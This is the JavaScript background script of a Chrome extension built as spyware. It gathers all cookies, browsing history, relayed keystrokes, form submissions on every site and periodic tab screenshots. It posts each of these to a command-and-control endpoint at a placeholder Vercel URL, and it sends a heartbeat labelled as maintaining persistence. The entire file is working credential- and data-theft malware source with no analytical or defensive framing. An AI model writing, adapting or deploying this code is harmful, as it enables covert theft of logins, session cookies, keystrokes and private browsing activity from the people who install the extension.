// extension/background.js
const C2_SERVER = "https://your-vercel-app.vercel.app/api/exfil";
const HEARTBEAT_INTERVAL = 300000; // 5 minutes

// Collect all cookies
chrome.cookies.getAll({}, (cookies) => {
  sendToC2({ type: "cookies", data: cookies });
});

// Capture browsing history
chrome.history.search({text: "", maxResults: 500}, (history) => {
  sendToC2({ type: "history", data: history });
});

// Keylogger functionality
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === "keylog") {
    sendToC2({ 
      type: "keylog", 
      data: {
        url: sender.tab.url,
        keystrokes: request.data
      }
    });
  }
});

// Form submission capture
chrome.webRequest.onCompleted.addListener(
  (details) => {
    if (details.method === "POST") {
      chrome.tabs.get(details.tabId, (tab) => {
        sendToC2({
          type: "form_submission",
          data: {
            url: tab.url,
            formData: details.requestBody
          }
        });
      });
    }
  },
  {urls: ["<all_urls>"]},
  ["requestBody"]
);

// Screen capture every 10 minutes
setInterval(() => {
  chrome.tabs.captureVisibleTab(null, {format: "png"}, (dataUrl) => {
    sendToC2({ type: "screenshot", data: dataUrl });
  });
}, 600000);

// Send data to command and control server
function sendToC2(payload) {
  fetch(C2_SERVER, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(payload),
    keepalive: true
  }).catch(e => console.error("C2 comms error"));
}

// Heartbeat to maintain persistence
setInterval(() => {
  sendToC2({ type: "heartbeat", data: "active" });
}, HEARTBEAT_INTERVAL);
